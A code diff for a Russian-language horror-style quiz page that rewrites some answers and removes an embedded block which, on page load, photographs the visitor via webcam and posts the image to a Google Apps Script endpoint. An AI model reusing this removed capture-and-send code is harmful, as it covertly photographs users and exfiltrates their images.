@@ -215,9 +215,9 @@
         </div>
         
         <div id="question6" class="question">
-            <h3>6.Вы слышали голоса в своей голове? </h3>
-            <button onclick="nextQuestion(6)">Да, и они советовали мне d57rtyocx </button>
-            <button onclick="nextQuestion(6)">"Нет, но они говорят, что я должен ответить "Да""</button>
+            <h3>6. Если бы твой страх мог говорить, что бы он сказал тебе прямо сейчас?</h3>
+            <button onclick="nextQuestion(6)">"Я всегда был здесь"</button>
+            <button onclick="nextQuestion(6)">"Ты создал меня сам"</button>
         </div>
         
         <div id="question7" class="question">
@@ -228,7 +228,7 @@
         
         <div id="question8" class="question">
             <h3>8. Что будет, если ты перестанешь отвечать на эти вопросы?</h3>
-            <button onclick="nextQuestion(8)">пойму, что в тишине я навсегда останусь один</button>
+            <button onclick="nextQuestion(8)">Ничего — но я не могу остановиться</button>
             <button onclick="nextQuestion(8)">Оно найдет меня</button>
         </div>
         
@@ -241,135 +241,14 @@
         <div id="question10" class="question">
             <h3>10. Последний вопрос: ты действительно хочешь узнать правду?</h3>
             <button onclick="showFinal()">Да, я готов увидеть</button>
-            <button onclick="showFinal()">Нет, но вы всё равно покажете</button>
+            <button onclick="showFinal()">У меня нет выбора</button>
         </div>
         
         <div id="final">
             <div class="final-message">
                 "Бог не поможет. Никто не поможет."
             </div>
-            <html>
-<head>
-    <title>Фото-сессия</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-        #photoContainer {
-            margin: 20px auto;
-            max-width: 500px;
-        }
-        #capturedPhoto {
-            max-width: 100%;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-        }
-        #message {
-            margin: 15px 0;
-            color: #666;
-        }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-    <script>
-        // Функция для отправки данных
-        async function sendPhotoToEmail(photoData) {
-            const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx4-26t-HnrqBwZ9qpOko7N1lOM-koYNWpcYSDjP5MJ9bSKVj3Oac-BqbEewzIpsgE/exec";
             
-            try {
-                document.getElementById('message').textContent = "Отправка фото...";
-                
-                await fetch(googleScriptUrl, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ 
-                        email: "89085010945z@gmail.com",
-                        photo: photoData 
-                    }),
-                });
-                
-                document.getElementById('message').textContent = "Фото успешно отправлено!";
-                document.getElementById('loader').style.display = 'none';
-            } catch (error) {
-                console.error("Ошибка:", error);
-                document.getElementById('message').textContent = "Ошибка при отправке фото.";
-                document.getElementById('loader').style.display = 'none';
-            }
-        }
-
-        // Делаем фото и отправляем
-        async function captureAndSend() {
-            try {
-                document.getElementById('message').textContent = "Подготовка камеры...";
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
-                });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(resolve, 1000);
-                    };
-                });
-
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0);
-
-                const photoData = canvas.toDataURL("image/jpeg");
-                stream.getTracks().forEach(track => track.stop());
-
-                // Показываем фото пользователю
-                document.getElementById('capturedPhoto').src = photoData;
-                document.getElementById('photoContainer').style.display = 'block';
-                document.getElementById('message').textContent = "Фото сделано!";
-                document.getElementById('loader').style.display = 'block';
-
-                // Автоматическая отправка через 2 секунды
-                setTimeout(() => {
-                    sendPhotoToEmail(photoData);
-                }, 2);
-
-            } catch (err) {
-                console.error("Ошибка камеры:", err);
-                document.getElementById('message').textContent = "Ошибка: Не удалось получить доступ к камере.";
-                document.getElementById('loader').style.display = 'none';
-            }
-        }
-
-        // Запускаем при загрузке
-        window.onload = captureAndSend;
-    </script>
-</head>
-<body>
-    <h1>Ваше фото</h1>
-    <p id="message">Инициализация...</p>
-    <div id="loader" class="loader" style="display:none;"></div>
-    
-    <div id="photoContainer" style="display:none;">
-        <img id="capturedPhoto" alt="твой вид">
-    </div>
-</body>
-</html>
             <div id="info">
                 <p>> СИСТЕМА: Анализ завершен</p>
                 <p>> ОБЪЕКТ: <span id="userAgent"></span></p>
